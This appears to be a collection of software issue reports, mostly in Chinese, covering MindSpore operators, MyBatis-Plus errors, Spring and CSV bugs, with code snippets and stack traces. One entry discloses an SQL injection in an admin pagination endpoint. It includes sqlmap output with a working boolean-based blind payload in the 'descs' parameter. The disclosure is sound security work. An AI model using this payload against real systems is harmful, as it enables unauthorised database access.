std::thread::_Impl&lt;std::_Bind_simple&lt;std::_Bind&lt;std::_Mem_fn&lt;void (paddle::operators::detail::AsyncGRPCServer::*)(bool, grpc::ServerCompletionQueue*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::function&lt;void ()&gt;)&gt; (paddle::operators::detail::AsyncGRPCServer*, bool, grpc::ServerCompletionQueue*, char const*, std::function&lt;void ()&gt;)&gt; ()&gt; &gt;::_M_run() + 250 8 0x7f4ac9449c80p 9 0x7f4acee9d6bap 10 0x7f4acebd33ddp clone + 109 *** Aborted at 1516395470 (unix time) try ""date -d @1516395470"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x497a) received by PID 18810 (TID 0x7f45f77fe700) from PID 18810; stack trace: *** @ 0x7f4aceea7390 (unknown) @ 0x7f4aceb01428 gsignal @ 0x7f4aceb0302a abort @ 0x7f4ac942084d __gnu_cxx::__verbose_terminate_handler() @ 0x7f4ac941e6b6 (unknown) @ 0x7f4ac941e701 std::terminate() @ 0x7f4ac9449d38 (unknown) @ 0x7f4acee9d6ba start_thread @ 0x7f4acebd33dd clone @ 0x0 (unknown)"
从表的findList过滤条件失效,"主表类:TgSeries 从表类:ThModel 主从关关系: thModel.fhSeries -&gt; tgSeries.fgSeries, 也就是 @Column(name=""fh_series"", attrName=""fhSeries.fgSeries"", label=""fh_series"", isUpdate=false, isQuery=false) (注意,默认生成的代码关联的外键是主表的id,这应该是个小bug? 我将其改为fhSeries关联主表的fgSeries) 执行这段代码生成器生成的代码: 发现SelectSqlProvider的findList并没能生成带where的sql: SELECT a.id AS ""id"", a.fh_series AS ""fhSeries.fgSeries"", a.fh_model AS ""fhModel"", .... a.create_date AS ""createDate"" FROM th_model a ORDER BY a.create_date ASC 生成的sql居然没有where .   <code>: /** * 获取单条数据 * @param tgSeries * @return */ @Override public TgSeries get(TgSeries tgSeries) { TgSeries entity = super.get(tgSeries); if (entity != null){ ThModel thModel = new ThModel(entity); thModel.setStatus(ThModel.STATUS_NORMAL); entity.setThModelList(thModelDao.findList(thModel)); } return entity; }"
mybatis-plus mapper层重载selectList,"当前使用版本 3.4.0没问题，3.5.1和3.5.2版本。 IService里的getOne引起的。 User user = userService.getOne(new LambdaQueryWrapper().eq(User::getName, ""Jone));   <code>: &lt;select id=""selectList"" resultType=""com.baomidou.mybatisplus.samples.association.entity.User""&gt; SELECT * FROM user t &lt;where&gt; &lt;if test=""p.id != null""&gt; and t.id = #{p.id} &lt;/if&gt; &lt;if test=""p.name != null""&gt; and t.name = #{p.name} &lt;/if&gt; &lt;if test=""p.companyId != null""&gt; and t.company_id = #{p.companyId} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.binding.BindingException: Parameter 'p' not found. Available parameters are [ew, param1] at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:96) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy60.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:224) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForMany(MybatisMapperMethod.java:166) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:77) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy61.selectList(Unknown Source) at com.baomidou.mybatisplus.core.mapper.BaseMapper.selectOne(BaseMapper.java:173) at java.lang.invoke.MethodHandle.invokeWithArguments(MethodHandle.java:627) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$DefaultMethodInvoker.invoke(MybatisMapperProxy.java:162) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy61.selectOne(Unknown Source) at com.baomidou.mybatisplus.extension.service.impl.ServiceImpl.getOne(ServiceImpl.java:202) at com.baomidou.mybatisplus.extension.service.IService.getOne(IService.java:320) at com.baomidou.mybatisplus.extension.service.IService$$FastClassBySpringCGLIB$$f8525d18.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at com.baomidou.mybatisplus.samples.association.service.impl.UserService$$EnhancerBySpringCGLIB$$be113cf.getOne(&lt;generated&gt;) at com.baomidou.mybatisplus.samples.association.AssociationTest.testSelectList(AssociationTest.java:42) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:725) at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:149) at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:140) at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:84) at org.junit.jupiter.engine.execution.ExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(ExecutableInvoker.java:115) at org.junit.jupiter.engine.execution.ExecutableInvoker.lambda$invoke$0(ExecutableInvoker.java:105) at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) at org.junit.jupiter.engine.execution.ExecutableInvoker.invoke(ExecutableInvoker.java:104) at org.junit.jupiter.engine.execution.ExecutableInvoker.invoke(ExecutableInvoker.java:98) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:214) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:210) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:135) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:66) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) at java.util.ArrayList.forEach(ArrayList.java:1249) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) at java.util.ArrayList.forEach(ArrayList.java:1249) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:107) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:88) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:54) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:67) at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:52) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:114) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:86) at org.junit.platform.launcher.core.DefaultLauncherSession$DelegatingLauncher.execute(DefaultLauncherSession.java:86) at org.junit.platform.launcher.core.SessionPerRequestLauncher.execute(SessionPerRequestLauncher.java:53) at com.intellij.junit5.JUnit5IdeaTestRunner.startRunnerWithArgs(JUnit5IdeaTestRunner.java:71) at com.intellij.rt.junit.IdeaTestRunner$Repeater$1.execute(IdeaTestRunner.java:38) at com.intellij.rt.execution.junit.TestsRepeater.repeat(TestsRepeater.java:11) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:35) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:235) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:54) Caused by: org.apache.ibatis.binding.BindingException: Parameter 'p' not found. Available parameters are [ew, param1] at org.apache.ibatis.binding.MapperMethod$ParamMap.get(MapperMethod.java:212) at org.apache.ibatis.scripting.xmltags.DynamicContext$ContextAccessor.getProperty(DynamicContext.java:120) at org.apache.ibatis.ognl.OgnlRuntime.getProperty(OgnlRuntime.java:3341) at org.apache.ibatis.ognl.ASTProperty.getValueBody(ASTProperty.java:121) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.ASTChain.getValueBody(ASTChain.java:141) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.ASTNotEq.getValueBody(ASTNotEq.java:50) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.Ognl.getValue(Ognl.java:586) at org.apache.ibatis.ognl.Ognl.getValue(Ognl.java:550) at org.apache.ibatis.scripting.xmltags.OgnlCache.getValue(OgnlCache.java:46) at org.apache.ibatis.scripting.xmltags.ExpressionEvaluator.evaluateBoolean(ExpressionEvaluator.java:32) at org.apache.ibatis.scripting.xmltags.IfSqlNode.apply(IfSqlNode.java:34) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.lambda$apply$0(MixedSqlNode.java:32) at java.util.ArrayList.forEach(ArrayList.java:1249) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.apply(MixedSqlNode.java:32) at org.apache.ibatis.scripting.xmltags.TrimSqlNode.apply(TrimSqlNode.java:55) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.lambda$apply$0(MixedSqlNode.java:32) at java.util.ArrayList.forEach(ArrayList.java:1249) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.apply(MixedSqlNode.java:32) at org.apache.ibatis.scripting.xmltags.DynamicSqlSource.getBoundSql(DynamicSqlSource.java:39) at org.apache.ibatis.mapping.MappedStatement.getBoundSql(MappedStatement.java:305) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:69) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy89.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:151) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:145) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 88 more"
【众智】【计算-AICPU开发】Mode,AICPU算子接入 计算输入张量指定维度上的众数及其对应的索引。 input_x values indices dim int 属性 keepdim bool 属性 对应底层算子 对应底层AICPU算子Mode torch/csrc/autograd/FunctionsManual.cpp   <code>: class Mode(Primitive):
【众智】【计算-GPU开发】AssignSub,"通过从'variable'减去给定的'value'更新variable('Parameter')。 接口参考库上： https://www.mindspore.cn/docs/api/zh-CN/r1.6/api_python/ops/mindspore.ops.AssignSub.html?highlight=assignsub variable value output use_locking 属性 对应底层算子 Classify Name Type Type Range Required INPUT variable int8, unit8, int32, f16, f32, double TRUE INPUT value int8, unit8, int32, f16, f32, double TRUE OUTPUT output int8, unit8, int32, f16, f32, double TRUE ATTR use_locking bool bool FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/AssignSub 3. 异常处理 4. 算子反向   <code>: class AssignSub(Primitive):"
[Security Bug]Sql injection on page pagination!!!,"can injection path: /admin/log/page?current=1&amp;descs=create_time&amp;size=20 injection parameter: descs playload: descs is string and no filter. MybatisPlus well use this descs string. ref: https://github.com/baomidou/mybatis-plus/issues/2150   <code>: [20:02:02] [INFO] resuming back-end DBMS 'mysql' [20:02:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: descs (GET) Type: boolean-based blind Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause Payload: current=1&amp;descs=create_time RLIKE (SELECT (CASE WHEN (8251=8251) THEN 0x6372656174655f74696d65 ELSE 0x28 END))&amp;size=20 ---"
[ST][MS][Conv2d]输入非float32类型时，Conv2d执行报错,"输入 非float32时，Conv2d执行报错 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_conv2d_float16_001 执行成功   <code>: import numpy as np import mindspore as ms import mindspore.nn as nn x = np.random.randn(1, 3, 10, 10) x_16 = ms.Tensor(x, dtype=ms.float16) b = nn.Conv2d(in_channels=3, out_channels=10, kernel_size=1) print(b(x_16)) TypeError: For primitive[Conv2D], the input type must be same. name:[w]:Ref[Tensor(F32)]. name:[x]:Tensor[Float16]."
插入实体类集合数据至CSV文件中，自定义工作簿(Sheet)名称未生效。且未反射生成表头。,"1.无法指定csv文件中的工作簿(Sheet)名称插入集合数据，自定义工作簿(Sheet)名称未生效。执行结果：插入的数据在第一个工作簿，并且工作簿名称为文件名称。 2.批量插入未反射字段名 代码 结果   <code>: public class UserAccount { public string ID { get; set; } public string ID1 { get; set; } public string ID2 { get; set; } public string ID3 { get; set; } public string ID4 { get; set; } public string ID5 { get; set; } public string ID6 { get; set; } public string ID7 { get; set; } public string ID8 { get; set; } public string ID9 { get; set; } public string ID10 { get; set; } public string ID11 { get; set; } public string ID12 { get; set; } public void write() { List&lt;UserAccount&gt; userAccounts = new List&lt;UserAccount&gt;(); for (int i = 0; i &lt; 20; i++) { UserAccount user = new UserAccount(); user.ID = Guid.NewGuid().ToString(); user.ID1 = Guid.NewGuid().ToString(); user.ID2 = Guid.NewGuid().ToString(); user.ID3 = Guid.NewGuid().ToString(); user.ID4 = Guid.NewGuid().ToString(); user.ID5 = Guid.NewGuid().ToString(); user.ID6 = Guid.NewGuid().ToString(); user.ID7 = Guid.NewGuid().ToString(); user.ID8 = Guid.NewGuid().ToString(); user.ID9 = Guid.NewGuid().ToString(); user.ID10 = Guid.NewGuid().ToString(); user.ID11 = Guid.NewGuid().ToString(); user.ID12 = Guid.NewGuid().ToString(); user.Name = ""名称："" + i; user.BoD = DateTime.Now.AddSeconds(i); user.Age = i; user.VIP = true; userAccounts.Add(user); } MiniExcel.Insert(""testCsv.csv"", userAccounts, ""账户名单""); }"
"【新需求】 ,博文设置部分内容登陆后才可以查看",首先非常感谢站长分享这个博客系统，个人觉得还是挺好的。 项目搭建比较简单，新人小白一看都会（我这个了解过java 的人都能跑起来）。 1. 目前有一个新的想法，看看站长是否觉得可以实现。   <code>: 在发布的博文里面 通常会涉及到一些代码，而有些代码内，需要让登陆上博客的人才能查看。博客系统上可以有注册用户的地方，但是需要后台进行审核。审核通过后才能进行在博客系统上登陆。
【众智】【计算-GPU开发】SparseSparseMaximum,"SparseSparseMaximum 1.1 功能介绍 稀疏算子，返回两个SparseTensors的元素最大值 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/sparse_ops.py class SparseSparseMaximum(Primitive): 1.3 异常处理 1.4 算子反向   <code>: REG_OP(SparseSparseMaximum) .INPUT(x1_indices, TensorType({DT_INT64})) .INPUT(x1_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .INPUT(x1_shape, TensorType({DT_INT64})) .INPUT(x2_indices, TensorType({DT_INT64})) .INPUT(x2_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .INPUT(x2_shape, TensorType({DT_INT64})) .OUTPUT(y_indices, TensorType({DT_INT64})) .OUTPUT(y_values, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, \ DT_UINT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .OP_END_FACTORY_REG(SparseSparseMaximum)"
新增 OnRetry 回调函数,可自定义 回调函数或在拦截器中重写 方法。 该方法或回调函数会在Forest请求触发重试时被调用执行。   <code>: OnRetry onRetry
创建RPC服务，异步Task类型报错,"当我创建异步服务,返回类型带泛型Task&lt;&gt;时，完全没问题，但直接返回Task方法类型，就报错了，检查源代码，好像是异步async类型都默认为带泛型Task&lt;&gt;,Task类型下进行.ReturnType.GetGenericArguments()[0] 直接报错：   <code>: if (methodInstance.Async) { methodInstance.ReturnType = method.ReturnType.GetGenericArguments()[0]; }"
Header file exanple.h is not found,"Clean build the code, will give a compilation error bug : /device cpu : -- MindSpore version : 0.0.2 -- Python version : 3.7.5 -- OS platform and distribution : Ubuntu -- GCC/Compiler version : 7.5 Pull changes Build with No errors   <code>: ./build.sh -e cpu -b cpu -j 10 -z -t on -d"
使用get方法传入一个date类型 无法反序列化,"pigx版本:2.7.0 操作系统: win10 是否修改包名: 否 1.使用get方式，新建一个DTO ， 入参用LocalDate， Date ，LocalDateTime 接受,用swagger访问会报错 2.使用post方式 requestBody则都正常。 总结：get方法如何传入一个Date类型的参数   <code>: @GetMapping(""/test"") public R test( TestDTO testDTO){ return new R&lt;&gt;(testDTO); } @Data public class TestDTO { private LocalDate localDate; } --使用swagger请求时返回错误 { ""timestamp"": ""2019-06-05 20:53:13"", ""status"": 400, ""error"": ""Bad Request"", ""errors"": [ { ""codes"": [ ""typeMismatch.testDTO.localDate"", ""typeMismatch.localDate"", ""typeMismatch.java.time.LocalDate"", ""typeMismatch"" ], ""arguments"": [ { ""codes"": [ ""testDTO.localDate"", ""localDate"" ], ""arguments"": null, ""defaultMessage"": ""localDate"", ""code"": ""localDate"" } ], ""defaultMessage"": ""Failed to convert property value of type 'java.lang.String' to required type 'java.time.LocalDate' for property 'localDate'; nested exception is org.springframework.core.convert.ConversionFailedException: Failed to convert from type [java.lang.String] to type [java.time.LocalDate] for value '2017-08-09'; nested exception is java.lang.IllegalArgumentException: Parse attempt failed for value [2017-08-09]"", ""objectName"": ""testDTO"", ""field"": ""localDate"", ""rejectedValue"": ""2017-08-09"", ""bindingFailure"": true, ""code"": ""typeMismatch"" } ], ""message"": ""Validation failed for object='testDTO'. Error count: 1"", ""path"": ""/log/test"" }"
建议修改Subsection 分段器文字说明,为时，active-color修改不了文字颜色，文字颜色默认为白色，但可以修改背景颜色。   <code>: mode subsection
Spring Boot 中开启事务注解，BeetlSql 不起作用,Spring Boot 方法中开启了 @Transactional 事务注释，经测试 是可以的，有异常会回滚，而使用 没有回滚。 版本：3.1.4   <code>: JdbcTemplate Beetlsql
【MindSpore】【Ascend】【C类】【retinaface】1p训练启动失败,"执行1p训练时，1P训练失败,同时希望给出预训练模型链接。 环境信息 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: /device ascend : -- CANN 版本: (CANN 5.0.4 B065) --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 --代码分支：r1.6分支 --mindspore版本：1.6.1 1、执行命令前，先导入RANK_TABLE_FILE 环境变量，src/config.py中的配置已经根据实际情况进行设置。 2、执行命令：bash ./scripts/run_standalone_train_ascend.sh 1p训练功能正常，成功生成模型文件，性能&amp;精度达标 实际执行1p训练启动命令后训练异常，日志信息如下：   <code>: [CRITICAL] DEVICE(56308,ffffbb7c1010,python):2022-05-26-08:58:15.681.875 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:558] LoadTask] Distribute Task Failed, error: mindspore/ccsrc/runtime/device/ascend/ge_runtime/task/hccl_task.cc:100 Distribute] davinci_model : load task fail, return ret: 1343225860 [ERROR] DEVICE(56308,ffffbb7c1010,python):2022-05-26-08:58:15.682.234 [mindspore/ccsrc/runtime/hardware/ascend/ascend_device_context.cc:604] ReportErrorMessage] Ascend error occurred, error message: EI9999: Inner Error! connected p2p timeout, timeout:120 s.local logicDevid:0, remote physic id:4.[FUNC:WaitP2PConnected][FILE:p2p_mgmt.cc][LINE:215] [CRITICAL] DEVICE(56308,ffffbb7c1010,python):2022-05-26-08:58:15.682.351 [mindspore/ccsrc/runtime/hardware/ascend/ascend_device_context.cc:389] PreprocessBeforeRunGraph] Preprocess failed before run graph: 1, error msg: mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:558 LoadTask] Distribute Task Failed, error: mindspore/ccsrc/runtime/device/ascend/ge_runtime/task/hccl_task.cc:100 Distribute] davinci_model : load task fail, return ret: 1343225860 [CRITICAL] ME(56308:281473827213328,MainProcess):2022-05-26-08:58:15.847.818 [mindspore/dataset/engine/datasets.py:2943] Uncaught exception: Traceback (most recent call last): File ""train.py"", line 223, in &lt;module&gt; train_with_resnet(cfg=config) File ""train.py"", line 125, in train_with_resnet model.train(max_epoch, ds_train, callbacks=callback_list) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 774, in train sink_size=sink_size) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 87, in wrapper func(self, *args, **kwargs) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 540, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/usr/local/lib/python3.7/dist-packages/mindspore/train/model.py"", line 608, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 479, in __call__ out = self.compile_and_run(*args) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 805, in compile_and_run self.compile(*inputs) File ""/usr/local/lib/python3.7/dist-packages/mindspore/nn/cell.py"", line 792, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/usr/local/lib/python3.7/dist-packages/mindspore/common/api.py"", line 632, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: mindspore/ccsrc/runtime/hardware/ascend/ascend_device_context.cc:389 PreprocessBeforeRunGraph] Preprocess failed before run graph: 1, error msg: mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:558 LoadTask] Distribute Task Failed, error: mindspore/ccsrc/runtime/device/ascend/ge_runtime/task/hccl_task.cc:100 Distribute] davinci_model : load task fail, return ret: 1343225860 [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:25.584.557 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] DeviceQueueOp(ID:0) Thread ID 281460732842480 is not responding. Interrupt again [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:26.584.878 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] DeviceQueueOp(ID:0) Thread ID 281460732842480 is not responding. Interrupt again [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:27.585.027 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] DeviceQueueOp(ID:0) Thread ID 281460732842480 is not responding. Interrupt again [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:28.585.238 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] DeviceQueueOp(ID:0) Thread ID 281460732842480 is not responding. Interrupt again [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:29.585.419 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] DeviceQueueOp(ID:0) Thread ID 281460732842480 is not responding. Interrupt again [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:30.585.720 [mindspore/ccsrc/minddata/dataset/util/task.cc:159] Join] DeviceQueueOp(ID:0) Thread ID 281460732842480 is not responding. Interrupt again [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:30.585.893 [mindspore/ccsrc/minddata/dataset/util/task.cc:165] Join] Wait 6 seconds, the task: DeviceQueueOp(ID:0) will be destroyed by TdtHostDestory. [ERROR] MD(56308,fffcaeffd1f0,python):2022-05-26-08:58:30.598.497 [mindspore/ccsrc/minddata/dataset/engine/tdt/tdt_plugin.cc:246] ReportErrorMessage] Ascend error occurred, error message: EH9999: Inner Error! [Push][Data]failed to send, tdt result = -1, device is 0, name is 7bfe2258-dcd1-11ec-ace9-0242ac110002[FUNC:ReportInnerError][FILE:log_inner.cpp][LINE:138] [ERROR] MD(56308,fffcaeffd1f0,python):2022-05-26-08:58:30.612.112 [mindspore/ccsrc/minddata/dataset/util/task_manager.cc:217] InterruptMaster] Task is terminated with err msg(more detail in info level log):TDT Push data into device Failed, check the first error or TraceBack first, more checking advises are: 1) if training is not ready, error might raised by network computing operator or environment configuration. 2) other cases, checking info level log or search this error in mindspore's FAQ for detail solution. [WARNING] MD(56308,ffffbb7c1010,python):2022-05-26-08:58:30.741.974 [mindspore/ccsrc/minddata/dataset/engine/datasetops/device_queue_op.cc:73] ~DeviceQueueOp] preprocess_batch: 45; batch_queue: 1, 0, 0, 1, 1, 0, 0, 1, 1, 0; push_start_time: 2022-05-26-08:54:56.643.397, 2022-05-26-08:54:56.780.216, 2022-05-26-08:54:57.894.253, 2022-05-26-08:54:57.917.260, 2022-05-26-08:54:58.038.876, 2022-05-26-08:54:58.056.627, 2022-05-26-08:54:58.451.846, 2022-05-26-08:54:58.477.222, 2022-05-26-08:54:58.559.920, 2022-05-26-08:54:58.581.943; push_end_time: 2022-05-26-08:54:56.582.257, 2022-05-26-08:54:56.656.008, 2022-05-26-08:54:56.792.216, 2022-05-26-08:54:57.908.509, 2022-05-26-08:54:57.933.349, 2022-05-26-08:54:58.048.681, 2022-05-26-08:54:58.068.853, 2022-05-26-08:54:58.463.196, 2022-05-26-08:54:58.490.696, 2022-05-26-08:54:58.571.389."
